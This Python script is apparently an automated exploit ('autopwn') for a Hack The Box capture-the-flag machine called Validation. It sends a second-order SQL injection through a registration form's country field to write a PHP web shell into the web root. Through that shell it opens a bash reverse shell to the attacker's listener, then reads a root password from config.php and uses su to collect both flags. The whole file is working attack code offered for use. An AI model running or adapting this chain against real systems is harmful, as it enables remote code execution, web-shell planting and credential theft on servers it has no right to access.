import argparse
import requests # type: ignore
import random
import sys

from multiprocessing import Process
from pwn import log, listen # type: ignore

PHP_RCE_FILE_NAME = 'rce.php'


class ValidationAutopwn:

    def __init__(self, lhost, lport, rhost):
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost

    def _craft_sqli_payload(self):
        log.info('Crafting sqli payload')

        return f"""Brazil' UNION select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile "/var/www/html/{PHP_RCE_FILE_NAME}";-- -"""

    def _craft_bash_payload(self):
        log.info('Crafting bash payload')
        
        return f'bash+-c+"bash+-i+>%26+/dev/tcp/{self.lhost}/{self.lport}+0>%261"'

    def _send_sqli_payload(self):
        data = {
            'username': f'dani-{random.randrange(100000, 999999)}',
            'country': self._craft_sqli_payload()
        }

        log.info('Sending sqli payload')
        requests.post(f'http://{self.rhost}/', data=data)

    def _send_bash_payload_to_webshell(self):
        cmd = self._craft_bash_payload()

        log.info('Sending bash payload')
        requests.get(f'http://{self.rhost}/{PHP_RCE_FILE_NAME}?cmd={cmd}')

    def _dump_shell_lines(self, shell, n_of_lines):
        for _ in range(n_of_lines):
            shell.recvline()

    def run(self):
        self._send_sqli_payload()

        try:
            bash_request = Process(target=self._send_bash_payload_to_webshell)
            bash_request.start()
        except Exception as e:
            log.error('There was an issue with bash payload request.')
            sys.exit(1)
        
        with listen(self.lport) as shell:
            if shell.wait_for_connection():
                log.success('Successful shell connection')

                # User flag
                log.info('Seeking user flag...')

                shell.sendline(b'cat /home/htb/user.txt')
                
                self._dump_shell_lines(shell, 3)

                user_flag = str(shell.recvline(), 'utf-8').replace('\n', '')

                log.success(f'User flag found! -> {user_flag}')

                # Root Flag
                log.info('Seeking root password...')
                    
                shell.sendline(b'cat config.php')

                self._dump_shell_lines(shell, 4)

                root_password = str(shell.recvline(), 'utf-8').replace('$password = "', '').replace('";', '').strip()

                log.success(f'Root password found! -> {root_password}')

                self._dump_shell_lines(shell, 1)

                shell.sendline(b'su root')
                shell.sendline(bytes(root_password, 'utf-8'))
                shell.sendline(b'whoami')
                shell.sendline(b'cd /root')
                shell.sendline(b'cat root.txt')

                self._dump_shell_lines(shell, 4)

                is_root = str(shell.recvline(), 'utf-8').replace('\n', '')

                if 'root' in is_root:
                    log.success('Root access obtained!')
                else:
                    log.error('Exploit Failed. Reason: Root access could not be obtained.')
                    sys.exit(1)

                root_flag = str(shell.recvline(), 'utf-8')

                log.success(f'Root flag found! -> {root_flag}')


if __name__ == '__main__':
    argparser = argparse.ArgumentParser(
                            prog='ValidationAutopwn',
                            description='Validation autopwn. It will grab both flags in the machine by exploiting a Second Order SQLi and exposed credentials.',
                            epilog='Example: python3 validation_autopwn -l 10.10.16.4 -p 4444 -r 10.129.95.235')

    argparser.add_argument('-l', '--lhost', type=str, required=True, help='Local host used to connect to the machine')
    argparser.add_argument('-p', '--lport', type=int, required=True, help='Local port used to connect to the machine')
    argparser.add_argument('-r', '--rhost', type=str, required=True, help='Remote, target host')

    args = argparser.parse_args()

    ValidationAutopwn(args.lhost, args.lport, args.rhost).run()
